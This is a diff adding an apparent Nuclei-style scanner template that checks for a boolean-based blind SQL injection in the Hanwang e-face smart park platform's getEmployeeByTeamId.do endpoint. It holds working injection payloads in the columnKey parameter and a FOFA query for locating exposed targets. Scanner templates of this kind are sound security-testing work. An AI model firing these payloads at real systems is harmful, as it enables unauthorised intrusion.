@@ -1,0 +1,47 @@
+id: poc-yaml-hw-e-face-pass-spmp-getemployeebyteamid-do-sqli
+info:
+  name: 汉王e脸通智慧园区管理平台 getEmployeeByTeamId.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fofa-query: icon_hash="1380907357"
+http:
+  - raw:
+      - |
+        GET /manage/patrolTeam/getEmployeeByTeamId.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=ptu.ID+RLIKE+(SELECT+(CASE+WHEN+(5992%3d5993)+THEN+0x7074752e4944+ELSE+0x28+END))%23+EeIa&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1&areaId=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":false"
+          - "网络异常"
+        condition: and
+      - type: word
+        words:
+          - "\"total\":"
+          - "\"obj\":"
+        negative: true
+
+  - raw:
+      - |
+        GET /manage/patrolTeam/getEmployeeByTeamId.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=ptu.ID+RLIKE+(SELECT+(CASE+WHEN+(5992%3d5992)+THEN+0x7074752e4944+ELSE+0x28+END))%23+EeIa&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1&areaId=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":false"
+          - "\"total\":"
+          - "\"obj\":"
+          - "网络异常"
+        condition: and
